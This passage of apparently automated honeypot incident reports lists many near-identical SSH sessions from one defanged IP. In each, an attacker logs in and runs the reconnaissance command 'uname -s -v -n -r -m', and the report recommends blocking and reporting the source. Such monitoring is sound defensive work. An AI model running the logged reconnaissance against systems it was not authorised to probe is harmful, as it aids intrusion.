| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:38` | `cowrie.session.connect` |
| `2026-09-24 16:33:38` | `cowrie.client.version` |
| `2026-09-24 16:33:38` | `cowrie.client.kex` |
| `2026-09-24 16:33:41` | `cowrie.login.success` |
| `2026-09-24 16:33:44` | `cowrie.session.params` |
| `2026-09-24 16:33:44` | `cowrie.command.input` |
| `2026-09-24 16:33:45` | `cowrie.log.closed` |
| `2026-09-24 16:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cad2885c7d39

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:38` | `cowrie.session.connect` |
| `2026-09-24 16:33:38` | `cowrie.client.version` |
| `2026-09-24 16:33:39` | `cowrie.client.kex` |
| `2026-09-24 16:33:42` | `cowrie.login.success` |
| `2026-09-24 16:33:48` | `cowrie.session.params` |
| `2026-09-24 16:33:48` | `cowrie.command.input` |
| `2026-09-24 16:33:48` | `cowrie.log.closed` |
| `2026-09-24 16:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c775163ba3be

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:38` | `cowrie.session.connect` |
| `2026-09-24 16:33:38` | `cowrie.client.version` |
| `2026-09-24 16:33:38` | `cowrie.client.kex` |
| `2026-09-24 16:33:42` | `cowrie.login.success` |
| `2026-09-24 16:33:45` | `cowrie.session.params` |
| `2026-09-24 16:33:45` | `cowrie.command.input` |
| `2026-09-24 16:33:47` | `cowrie.log.closed` |
| `2026-09-24 16:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-122c67f6b7d9

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:38` | `cowrie.session.connect` |
| `2026-09-24 16:33:38` | `cowrie.client.version` |
| `2026-09-24 16:33:38` | `cowrie.client.kex` |
| `2026-09-24 16:33:41` | `cowrie.login.success` |
| `2026-09-24 16:33:45` | `cowrie.session.params` |
| `2026-09-24 16:33:45` | `cowrie.command.input` |
| `2026-09-24 16:33:45` | `cowrie.log.closed` |
| `2026-09-24 16:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e115d58c867c

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:40` | `cowrie.session.connect` |
| `2026-09-24 16:33:40` | `cowrie.client.version` |
| `2026-09-24 16:33:41` | `cowrie.client.kex` |
| `2026-09-24 16:33:45` | `cowrie.login.success` |
| `2026-09-24 16:33:47` | `cowrie.session.params` |
| `2026-09-24 16:33:47` | `cowrie.command.input` |
| `2026-09-24 16:33:48` | `cowrie.log.closed` |
| `2026-09-24 16:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96fb3c7b5c67

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:40` | `cowrie.session.connect` |
| `2026-09-24 16:33:40` | `cowrie.client.version` |
| `2026-09-24 16:33:41` | `cowrie.client.kex` |
| `2026-09-24 16:33:45` | `cowrie.login.success` |
| `2026-09-24 16:33:48` | `cowrie.session.params` |
| `2026-09-24 16:33:48` | `cowrie.command.input` |
| `2026-09-24 16:33:49` | `cowrie.log.closed` |
| `2026-09-24 16:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26798e94b22a

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:40` | `cowrie.session.connect` |
| `2026-09-24 16:33:40` | `cowrie.client.version` |
| `2026-09-24 16:33:41` | `cowrie.client.kex` |
| `2026-09-24 16:33:44` | `cowrie.login.success` |
| `2026-09-24 16:33:46` | `cowrie.session.params` |
| `2026-09-24 16:33:46` | `cowrie.command.input` |
| `2026-09-24 16:33:48` | `cowrie.log.closed` |
| `2026-09-24 16:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55eccc7b2e95

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:41` | `cowrie.session.connect` |
| `2026-09-24 16:33:41` | `cowrie.client.version` |
| `2026-09-24 16:33:43` | `cowrie.client.kex` |
| `2026-09-24 16:33:48` | `cowrie.login.success` |
| `2026-09-24 16:33:49` | `cowrie.session.params` |
| `2026-09-24 16:33:49` | `cowrie.command.input` |
| `2026-09-24 16:33:51` | `cowrie.log.closed` |
| `2026-09-24 16:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ce1c85b15e3

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:42` | `cowrie.session.connect` |
| `2026-09-24 16:33:42` | `cowrie.client.version` |
| `2026-09-24 16:33:42` | `cowrie.client.kex` |
| `2026-09-24 16:33:48` | `cowrie.login.success` |
| `2026-09-24 16:33:51` | `cowrie.session.params` |
| `2026-09-24 16:33:51` | `cowrie.command.input` |
| `2026-09-24 16:33:52` | `cowrie.log.closed` |
| `2026-09-24 16:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-020aa7b1ab6e

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:44` | `cowrie.session.connect` |
| `2026-09-24 16:33:44` | `cowrie.client.version` |
| `2026-09-24 16:33:45` | `cowrie.client.kex` |
| `2026-09-24 16:33:48` | `cowrie.login.success` |
| `2026-09-24 16:33:51` | `cowrie.session.params` |
| `2026-09-24 16:33:51` | `cowrie.command.input` |
| `2026-09-24 16:33:52` | `cowrie.log.closed` |
| `2026-09-24 16:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0149ed80332c

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:44` | `cowrie.session.connect` |
| `2026-09-24 16:33:44` | `cowrie.client.version` |
| `2026-09-24 16:33:45` | `cowrie.client.kex` |
| `2026-09-24 16:33:49` | `cowrie.login.success` |
| `2026-09-24 16:33:50` | `cowrie.session.params` |
| `2026-09-24 16:33:50` | `cowrie.command.input` |
| `2026-09-24 16:33:52` | `cowrie.log.closed` |
| `2026-09-24 16:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2141c8b1d17

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:44` | `cowrie.session.connect` |
| `2026-09-24 16:33:44` | `cowrie.client.version` |
| `2026-09-24 16:33:45` | `cowrie.client.kex` |
| `2026-09-24 16:33:50` | `cowrie.login.success` |
| `2026-09-24 16:33:53` | `cowrie.session.params` |
| `2026-09-24 16:33:53` | `cowrie.command.input` |
| `2026-09-24 16:33:55` | `cowrie.log.closed` |
| `2026-09-24 16:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e4c02ea073

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:45` | `cowrie.session.connect` |
| `2026-09-24 16:33:45` | `cowrie.client.version` |
| `2026-09-24 16:33:48` | `cowrie.client.kex` |
| `2026-09-24 16:33:52` | `cowrie.login.success` |
| `2026-09-24 16:33:55` | `cowrie.session.params` |
| `2026-09-24 16:33:55` | `cowrie.command.input` |
| `2026-09-24 16:33:56` | `cowrie.log.closed` |
| `2026-09-24 16:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1a0206c8cdb

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:45` | `cowrie.session.connect` |
| `2026-09-24 16:33:45` | `cowrie.client.version` |
| `2026-09-24 16:33:47` | `cowrie.client.kex` |
| `2026-09-24 16:33:51` | `cowrie.login.success` |
| `2026-09-24 16:33:52` | `cowrie.session.params` |
| `2026-09-24 16:33:52` | `cowrie.command.input` |
| `2026-09-24 16:33:54` | `cowrie.log.closed` |
| `2026-09-24 16:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d3fd4f81846

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:48` | `cowrie.session.connect` |
| `2026-09-24 16:33:48` | `cowrie.client.version` |
| `2026-09-24 16:33:48` | `cowrie.client.kex` |
| `2026-09-24 16:33:52` | `cowrie.login.success` |
| `2026-09-24 16:33:56` | `cowrie.session.params` |
| `2026-09-24 16:33:56` | `cowrie.command.input` |
| `2026-09-24 16:34:00` | `cowrie.log.closed` |
| `2026-09-24 16:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba8000fee75

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:48` | `cowrie.session.connect` |
| `2026-09-24 16:33:48` | `cowrie.client.version` |
| `2026-09-24 16:33:48` | `cowrie.client.kex` |
| `2026-09-24 16:33:52` | `cowrie.login.success` |
| `2026-09-24 16:33:54` | `cowrie.session.params` |
| `2026-09-24 16:33:54` | `cowrie.command.input` |
| `2026-09-24 16:33:55` | `cowrie.log.closed` |
| `2026-09-24 16:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f2a86e5dbb

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:48` | `cowrie.session.connect` |
| `2026-09-24 16:33:48` | `cowrie.client.version` |
| `2026-09-24 16:33:48` | `cowrie.client.kex` |
| `2026-09-24 16:33:52` | `cowrie.login.success` |
| `2026-09-24 16:33:57` | `cowrie.session.params` |
| `2026-09-24 16:33:57` | `cowrie.command.input` |
| `2026-09-24 16:34:00` | `cowrie.log.closed` |
| `2026-09-24 16:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abf8dc787120

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:49` | `cowrie.session.connect` |
| `2026-09-24 16:33:49` | `cowrie.client.version` |
| `2026-09-24 16:33:49` | `cowrie.client.kex` |
| `2026-09-24 16:33:52` | `cowrie.login.success` |
| `2026-09-24 16:33:55` | `cowrie.session.params` |
| `2026-09-24 16:33:55` | `cowrie.command.input` |
| `2026-09-24 16:33:55` | `cowrie.log.closed` |
| `2026-09-24 16:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-403bf4e27e10

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:51` | `cowrie.session.connect` |
| `2026-09-24 16:33:51` | `cowrie.client.version` |
| `2026-09-24 16:33:52` | `cowrie.client.kex` |
| `2026-09-24 16:33:55` | `cowrie.login.success` |
| `2026-09-24 16:33:58` | `cowrie.session.params` |
| `2026-09-24 16:33:58` | `cowrie.command.input` |
| `2026-09-24 16:34:00` | `cowrie.log.closed` |
| `2026-09-24 16:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b6189d55f61

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:51` | `cowrie.session.connect` |
| `2026-09-24 16:33:51` | `cowrie.client.version` |
| `2026-09-24 16:33:52` | `cowrie.client.kex` |
| `2026-09-24 16:33:55` | `cowrie.login.success` |
| `2026-09-24 16:34:00` | `cowrie.session.params` |
| `2026-09-24 16:34:00` | `cowrie.command.input` |
| `2026-09-24 16:34:00` | `cowrie.log.closed` |
| `2026-09-24 16:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd87a81957d

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:51` | `cowrie.session.connect` |
| `2026-09-24 16:33:51` | `cowrie.client.version` |
| `2026-09-24 16:33:52` | `cowrie.client.kex` |
| `2026-09-24 16:33:55` | `cowrie.login.success` |
| `2026-09-24 16:33:59` | `cowrie.session.params` |
| `2026-09-24 16:33:59` | `cowrie.command.input` |
| `2026-09-24 16:34:00` | `cowrie.log.closed` |
| `2026-09-24 16:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab3215d5b27e

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:51` | `cowrie.session.connect` |
| `2026-09-24 16:33:51` | `cowrie.client.version` |
| `2026-09-24 16:33:52` | `cowrie.client.kex` |
| `2026-09-24 16:33:55` | `cowrie.login.success` |
| `2026-09-24 16:33:58` | `cowrie.session.params` |
| `2026-09-24 16:33:58` | `cowrie.command.input` |
| `2026-09-24 16:34:00` | `cowrie.log.closed` |
| `2026-09-24 16:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c2221e3953

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:54` | `cowrie.session.connect` |
| `2026-09-24 16:33:54` | `cowrie.client.version` |
| `2026-09-24 16:33:55` | `cowrie.client.kex` |
| `2026-09-24 16:34:00` | `cowrie.login.success` |
| `2026-09-24 16:34:02` | `cowrie.session.params` |
| `2026-09-24 16:34:02` | `cowrie.command.input` |
| `2026-09-24 16:34:03` | `cowrie.log.closed` |
| `2026-09-24 16:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a249fdcf81c

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:54` | `cowrie.session.connect` |
| `2026-09-24 16:33:54` | `cowrie.client.version` |
| `2026-09-24 16:33:55` | `cowrie.client.kex` |
| `2026-09-24 16:34:00` | `cowrie.login.success` |
| `2026-09-24 16:34:02` | `cowrie.session.params` |
| `2026-09-24 16:34:02` | `cowrie.command.input` |
| `2026-09-24 16:34:03` | `cowrie.log.closed` |
| `2026-09-24 16:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c524b83b1c

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:54` | `cowrie.session.connect` |
| `2026-09-24 16:33:54` | `cowrie.client.version` |
| `2026-09-24 16:33:55` | `cowrie.client.kex` |
| `2026-09-24 16:34:00` | `cowrie.login.success` |
| `2026-09-24 16:34:01` | `cowrie.session.params` |
| `2026-09-24 16:34:01` | `cowrie.command.input` |
| `2026-09-24 16:34:03` | `cowrie.log.closed` |
| `2026-09-24 16:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-817d829ce0f1

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:55` | `cowrie.session.connect` |
| `2026-09-24 16:33:55` | `cowrie.client.version` |
| `2026-09-24 16:33:56` | `cowrie.client.kex` |
| `2026-09-24 16:34:00` | `cowrie.login.success` |
| `2026-09-24 16:34:03` | `cowrie.session.params` |
| `2026-09-24 16:34:03` | `cowrie.command.input` |
| `2026-09-24 16:34:03` | `cowrie.log.closed` |
| `2026-09-24 16:34:03` | `cowrie.session.closed` |

